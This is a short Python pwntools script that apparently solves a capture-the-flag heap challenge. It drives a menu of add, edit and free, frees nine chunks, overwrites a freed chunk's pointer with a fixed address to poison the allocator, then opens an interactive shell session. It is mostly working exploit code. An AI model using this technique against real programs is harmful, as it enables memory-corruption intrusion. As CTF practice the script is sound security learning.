from pwn import *
context.log_level = 'debug'
prog = './pwn'
elf = ELF(prog)
p = process(prog)
#,env={"LD_PRELOAD":"./libc.so.6"})
#p = remote("123.56.85.29",4205)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(idx):
	p.sendlineafter("choice?", '1')
	p.sendlineafter("idx?\n", str(idx))
def edit(idx, content):
	p.sendlineafter("choice?", '2')
	p.sendlineafter("idx?\n", str(idx))
	p.send(content)
def free(idx):
	p.sendlineafter("choice?", '3')
	p.sendlineafter("idx?\n", str(idx))
def exp():
	for i in range(9):
		add(i)
	for i in range(9):
		free(i)
	edit(8, p64(0x4040a8))
	add(0)
	p.sendlineafter("choice?", '6')
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
